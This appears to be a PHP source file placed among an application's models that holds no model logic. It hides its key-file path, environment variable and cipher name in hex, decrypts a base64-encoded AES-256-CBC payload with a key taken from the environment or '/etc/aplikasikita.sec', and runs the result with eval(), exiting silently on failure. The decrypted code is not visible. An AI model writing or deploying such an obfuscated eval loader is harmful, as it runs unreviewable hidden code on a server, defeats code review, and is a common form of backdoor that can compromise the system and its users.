<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('MvW43iV6c3QemOGtJ6sH8A==');

$c=base64_decode(

'Qs7Akz5KB9TPMpqKZYhu7ZDemt4YwSuW2wGeOb+g+Max/QML59qfbIvJPi+jRjlmxN41wIrNwd6r' .
'Pa6WKs+dVo1AKW2/7qZZH37EcJ6WnjsKpoFtafZGVRHqikNWV32jK2JIFebsZ8bz/h+xzwY4P9ko' .
'2gwfMotrsQ+FZqy+KKMbI4HMlnuKUWg5QuN0PCIZ90TAC6uVT//6NKiFmLLjwlnA+rsb8V822E1/' .
'puMdRVqXcY7QVcL8arR1UPQ37cLigI0qBjV8ZAvXodHaNIPSRipDUMc50uFJnamqaQMiKS4VCGXv' .
'QxcFaMyUTP+2vjJYH0fEZeABCM/WFzJmbd2Mvrcois/q5gdH4FMJ92ZD8rsdckWCyRe0DIDpUo2w' .
'bIoaCICnfs3bkBHMUMZtaxB1zwn24nKh2ierA55w88IlAPoLsknCOlxVR+Dnrr5mZR8Ha/kmeTLl' .
'UHzDfY0KsVJV5yISmHvFdpJBKZ+PMhOk64h3Jx1/ixKrbzhDbLFfNNbubEggojpewW4o3gqy2qnq' .
'1IY0s/7q0r5ITQeCPBnz86BN8Auki94btoEgld5PMR3oUYcmS1f1m5gFL7KJYPWrOqZAw8ucrBMT' .
'P6cANYTRuZ5LF5nghvMr1uXOS9NAG80/MiuFPtYn81IOnq7zHTKphVu8ZgqzY5zdS8pAETFGQsO8' .
'xIn2A5PsclDtKHtgiuI+aTaOIRyqNxgsteGdfleBXZwyuTCaayoeOWRiTjMh50z+yU9DYL4qZ4fh' .
'Cu5sdQj6tspWdTU3ArQ+8qv98NAt6WbP5LkQmz+nEmAttxvrr5yrJAQ+8NRdFs4SHiwLkYPU7l/P' .
'uLwlrdI+hsQZHK122qOmVpu53JixO+u/HXoCacUxtEXvyi4GjIH4HnICkQJDKt3kPVEAYHiW4gT1' .
'aodPh0dgMdTUUS9AQd5wwMjNR6qV6f+Vdj66nCTihH+Lee44B97x8eljrVhosA3zp9piYQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

